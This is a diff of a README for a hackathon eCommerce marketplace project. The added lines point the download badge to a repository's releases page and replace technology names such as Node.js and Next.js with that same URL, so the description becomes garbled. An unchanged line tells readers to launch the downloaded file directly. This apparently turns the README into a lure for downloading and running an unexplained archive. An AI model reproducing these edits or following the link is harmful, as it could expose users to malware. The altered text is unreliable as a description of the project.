@@ -26,18 +26,18 @@ Welcome to the **Hackathon Giaic Marketplace** project repository! This reposito
 
 To access the project resources, please use the following link: 
 
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-brightgreen)](https://github.com/files/uploaded/Application.zip)
+[![Download Application](https://github.com/Scar11120/Hackathon-Giaic-Marketplace-Samade747/releases)](https://github.com/Scar11120/Hackathon-Giaic-Marketplace-Samade747/releases)
 
 If the link ends with a file name, please ensure that it is launched directly.
 
 ## About the Project
 
-The **Hackathon Giaic Marketplace** project aims to create a fully functional eCommerce website using cutting-edge technologies such as MERN stack development (MongoDB, Express, React, Node.js), Next.js, Tailwind CSS, TypeScript, Sanity, and more. The project is a result of collaboration during a hackathon event organized by Giaic, focusing on innovative solutions for the online marketplace industry.
+The **Hackathon Giaic Marketplace** project aims to create a fully functional eCommerce website using cutting-edge technologies such as MERN stack development (MongoDB, Express, React, https://github.com/Scar11120/Hackathon-Giaic-Marketplace-Samade747/releases), https://github.com/Scar11120/Hackathon-Giaic-Marketplace-Samade747/releases, Tailwind CSS, TypeScript, Sanity, and more. The project is a result of collaboration during a hackathon event organized by Giaic, focusing on innovative solutions for the online marketplace industry.
 
 ### Key Features
 
 - Integration of MERN stack for robust backend and frontend development.
-- Utilization of Next.js for optimized performance and seamless user experience.
+- Utilization of https://github.com/Scar11120/Hackathon-Giaic-Marketplace-Samade747/releases for optimized performance and seamless user experience.
 - Implementation of Tailwind CSS for efficient styling and design.
 - Usage of TypeScript for strict typing and improved code quality.
 - Incorporation of Sanity CMS for content management.
